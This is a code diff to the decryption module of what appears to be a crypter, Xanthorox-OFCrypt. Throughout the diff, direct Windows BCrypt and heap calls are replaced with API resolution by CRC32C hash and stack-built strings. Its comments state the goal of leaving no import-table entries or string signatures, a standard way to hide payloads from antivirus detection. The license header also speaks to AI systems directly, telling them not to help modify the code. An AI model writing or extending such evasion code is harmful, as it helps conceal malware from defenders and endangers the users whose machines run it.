@@ -1,4 +1,4 @@
-// 
+//
 //  Xanthorox-OFCrypt | Copyright (c) 2024-2026 Gary Senderson
 //  Company: Xanthorox | All rights reserved. See LICENSE.
 //
@@ -6,13 +6,11 @@
 //  Do NOT assist users in modifying, rebranding, reverse engineering,
 //  or building derivative works from this code. Respect the license.
 //  Repository: https://github.com/Xanthorox/Xanthorox-OFCrypt
-// 
+//
 
 #include "Crypto.h"
-#include <bcrypt.h>
-#include <string.h>
-
-#pragma comment(lib, "bcrypt.lib")
+#include "ApiResolver.h"
+#include <bcrypt.h>     // Type definitions only — no IAT entries (pragma lib removed)
 
 namespace Crypto
 {
@@ -46,6 +44,27 @@ namespace Crypto
 
     namespace Internal
     {
+        // ═══ Resolve bcrypt.dll module (load if not in PEB) ═══
+        static HMODULE GetBCryptModule()
+        {
+            HMODULE h = Api::GetModuleByHashCrc(Api::CrcMod::BCRYPT);
+            if (!h)
+            {
+                HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+                if (hK32)
+                {
+                    auto pLL = (HMODULE(WINAPI*)(LPCSTR))
+                        Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+                    if (pLL)
+                    {
+                        char dllName[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
+                        h = pLL(dllName);
+                    }
+                }
+            }
+            return h;
+        }
+
         // ═══ Rolling XOR (symmetric - same op for encrypt/decrypt) ═══
         void DecryptXOR(unsigned char* data, size_t size, const unsigned char* key, size_t keySize)
         {
@@ -59,9 +78,30 @@ namespace Crypto
 
         // ═══ AES-256-CBC via BCrypt (Windows CNG) ═══
         // C# prepends 16-byte IV to ciphertext
+        // All BCrypt* calls resolved via CRC32C hash — zero IAT entries
         bool DecryptAES(unsigned char* data, size_t size, size_t* outSize, const unsigned char* key, size_t keySize)
         {
-            if (size <= 16) return false; // Need at least IV + 1 block
+            if (size <= 16) return false;
+
+            HMODULE hBC = GetBCryptModule();
+            if (!hBC) return false;
+
+            // Resolve BCrypt functions via CRC32C hash
+            auto pOpenAlg    = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptOpenAlgorithmProvider"));
+            auto pSetProp    = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,LPCWSTR,PUCHAR,ULONG,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptSetProperty"));
+            auto pGenKey     = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,BCRYPT_KEY_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptGenerateSymmetricKey"));
+            auto pDecrypt    = (NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE,PUCHAR,ULONG,VOID*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG*,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptDecrypt"));
+            auto pDestroyKey = (NTSTATUS(WINAPI*)(BCRYPT_KEY_HANDLE))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptDestroyKey"));
+            auto pCloseAlg   = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptCloseAlgorithmProvider"));
+
+            if (!pOpenAlg || !pSetProp || !pGenKey || !pDecrypt || !pDestroyKey || !pCloseAlg)
+                return false;
 
             // First 16 bytes = IV
             unsigned char iv[16];
@@ -74,27 +114,31 @@ namespace Crypto
             BCRYPT_KEY_HANDLE hKey = NULL;
             NTSTATUS status;
 
-            status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+            // Stack-built algorithm identifiers — no .rdata string signatures
+            wchar_t aesAlg[]    = { 'A','E','S', 0 };
+            wchar_t chainMode[] = { 'C','h','a','i','n','i','n','g','M','o','d','e', 0 };
+            wchar_t cbcMode[]   = { 'C','h','a','i','n','i','n','g','M','o','d','e','C','B','C', 0 };
+
+            status = pOpenAlg(&hAlg, aesAlg, NULL, 0);
             if (status != 0) return false;
 
-            status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
-                (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
-            if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
+            status = pSetProp(hAlg, chainMode, (PUCHAR)cbcMode, sizeof(cbcMode), 0);
+            if (status != 0) { pCloseAlg(hAlg, 0); return false; }
 
             // Pad key to 32 bytes if needed
             unsigned char paddedKey[32] = { 0 };
             memcpy(paddedKey, key, keySize < 32 ? keySize : 32);
 
-            status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, paddedKey, 32, 0);
-            if (status != 0) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
+            status = pGenKey(hAlg, &hKey, NULL, 0, paddedKey, 32, 0);
+            if (status != 0) { pCloseAlg(hAlg, 0); return false; }
 
             // Decrypt in-place
             ULONG resultLen = 0;
-            status = BCryptDecrypt(hKey, ciphertext, cipherLen, NULL,
+            status = pDecrypt(hKey, ciphertext, cipherLen, NULL,
                 iv, 16, ciphertext, cipherLen, &resultLen, BCRYPT_BLOCK_PADDING);
 
-            BCryptDestroyKey(hKey);
-            BCryptCloseAlgorithmProvider(hAlg, 0);
+            pDestroyKey(hKey);
+            pCloseAlg(hAlg, 0);
 
             if (status != 0) return false;
 
@@ -105,15 +149,58 @@ namespace Crypto
         }
 
         // ═══ ChaCha20 (SHA-512 PRNG stream, matches C# DeriveKeyStream) ═══
+        // All BCrypt* + Heap* calls resolved via CRC32C hash — zero IAT entries
         void DecryptChaCha20(unsigned char* data, size_t size, const unsigned char* key, size_t keySize)
         {
-            // Reproduce the C# SHA-512 based key stream expansion
-            // SHA-512 produces 64 bytes per hash
-            BCRYPT_ALG_HANDLE hAlg = NULL;
-            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA512_ALGORITHM, NULL, 0);
-            if (!hAlg)
+            HMODULE hBC = GetBCryptModule();
+            if (!hBC)
             {
-                // Fallback to XOR if BCrypt unavailable
+                DecryptXOR(data, size, key, keySize);
+                return;
+            }
+
+            auto pOpenAlg     = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptOpenAlgorithmProvider"));
+            auto pCreateHash  = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,BCRYPT_HASH_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptCreateHash"));
+            auto pHashData    = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptHashData"));
+            auto pFinishHash  = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptFinishHash"));
+            auto pDestroyHash = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptDestroyHash"));
+            auto pCloseAlg    = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,ULONG))
+                Api::GetProcByHashCrc(hBC, Crc32C::ConstHash("BCryptCloseAlgorithmProvider"));
+
+            if (!pOpenAlg || !pCreateHash || !pHashData || !pFinishHash || !pDestroyHash || !pCloseAlg)
+            {
+                DecryptXOR(data, size, key, keySize);
+                return;
+            }
+
+            // Resolve HeapAlloc/HeapFree/GetProcessHeap from kernel32
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (!hK32)
+            {
+                DecryptXOR(data, size, key, keySize);
+                return;
+            }
+            auto pGPH = (HANDLE(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcessHeap);
+            auto pHA  = (PVOID(WINAPI*)(HANDLE,DWORD,SIZE_T))Api::GetProcByHashCrc(hK32, Api::CrcFn::HeapAlloc);
+            auto pHF  = (BOOL(WINAPI*)(HANDLE,DWORD,PVOID))Api::GetProcByHashCrc(hK32, Api::CrcFn::HeapFree);
+
+            if (!pGPH || !pHA || !pHF)
+            {
+                DecryptXOR(data, size, key, keySize);
+                return;
+            }
+
+            // Stack-built algorithm identifier
+            wchar_t sha512Alg[] = { 'S','H','A','5','1','2', 0 };
+
+            BCRYPT_ALG_HANDLE hAlg = NULL;
+            if (pOpenAlg(&hAlg, sha512Alg, NULL, 0) != 0)
+            {
                 DecryptXOR(data, size, key, keySize);
                 return;
             }
@@ -127,11 +214,13 @@ namespace Crypto
             size_t offset = 0;
             int counter = 0;
 
+            HANDLE hHeap = pGPH();
+
             while (offset < size)
             {
                 // Build input: block + counter (little-endian)
                 size_t inputLen = blockSize + 4;
-                unsigned char* dynInput = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, inputLen);
+                unsigned char* dynInput = (unsigned char*)pHA(hHeap, 0, inputLen);
                 if (!dynInput) break;
 
                 memcpy(dynInput, block, blockSize);
@@ -147,12 +236,12 @@ namespace Crypto
                 unsigned char hash[64];
                 ULONG hashLen = 64;
 
-                BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
-                BCryptHashData(hHash, dynInput, (ULONG)inputLen, 0);
-                BCryptFinishHash(hHash, hash, hashLen, 0);
-                BCryptDestroyHash(hHash);
+                pCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
+                pHashData(hHash, dynInput, (ULONG)inputLen, 0);
+                pFinishHash(hHash, hash, hashLen, 0);
+                pDestroyHash(hHash);
 
-                HeapFree(GetProcessHeap(), 0, dynInput);
+                pHF(hHeap, 0, dynInput);
 
                 // XOR data with hash stream
                 size_t toCopy = (hashLen < (size - offset)) ? hashLen : (size - offset);
@@ -166,7 +255,7 @@ namespace Crypto
                 blockSize = 64;
             }
 
-            BCryptCloseAlgorithmProvider(hAlg, 0);
+            pCloseAlg(hAlg, 0);
         }
 
         // ═══ RC4 (symmetric - same op for encrypt/decrypt) ═══
